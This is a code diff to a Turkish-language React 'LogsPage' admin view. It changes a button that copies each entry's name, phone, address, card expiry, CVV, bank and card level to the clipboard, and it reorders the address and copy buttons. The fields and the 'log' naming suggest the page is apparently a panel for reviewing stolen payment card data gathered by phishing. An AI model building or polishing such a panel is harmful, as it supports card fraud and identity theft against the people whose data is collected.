@@ -381,15 +381,13 @@ export default function LogsPage() {
       log.skt || '',
       log.cvv || '',
       log.banka || '',
-      log.marka || '',
       log.seviye || ''
-    ].filter(Boolean).join(' | ');
+    ].filter(Boolean).join(' ');
 
-    const textToCopy = `Ad soyad: ${adSoyad}
-Telefon: ${telefon}
+    const textToCopy = `Ad Soyad: ${adSoyad}
+Tel No: ${telefon}
 Adres: ${adresVal}
-Kart Bilgi: ${cardDetails}
-Geldiği Tarih: ${log.tarih || ''}`;
+Kart Bilgi: ${cardDetails}`;
 
     try {
       await navigator.clipboard.writeText(textToCopy);
@@ -1104,21 +1102,21 @@ Geldiği Tarih: ${log.tarih || ''}`;
                       <td className="py-2 px-1 whitespace-nowrap">
                         <div className="flex items-center gap-1.5">
                           <button
-                            onClick={() => showAddressModal(log)}
-                            className="p-1.5 text-gray-500 hover:text-brand-500 hover:bg-brand-50 rounded-lg transition-colors dark:text-gray-400 dark:hover:text-brand-400 dark:hover:bg-brand-500/10"
-                            title="Adres Detayı"
-                          >
-                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" />
-                            </svg>
-                          </button>
-                          <button
                             onClick={() => copyFormattedLog(log)}
                             className="p-1.5 text-gray-500 hover:text-brand-500 hover:bg-brand-50 rounded-lg transition-colors dark:text-gray-400 dark:hover:text-brand-400 dark:hover:bg-brand-500/10"
                             title="Log Bilgilerini Kopyala"
                           >
                             <svg className="w-5.5 h-5.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                               <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m-5 4h6m-6 4h6m-6 4h6" />
+                            </svg>
+                          </button>
+                          <button
+                            onClick={() => showAddressModal(log)}
+                            className="p-1.5 text-gray-500 hover:text-brand-500 hover:bg-brand-50 rounded-lg transition-colors dark:text-gray-400 dark:hover:text-brand-400 dark:hover:bg-brand-500/10"
+                            title="Adres Detayı"
+                          >
+                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" />
                             </svg>
                           </button>
                         </div>
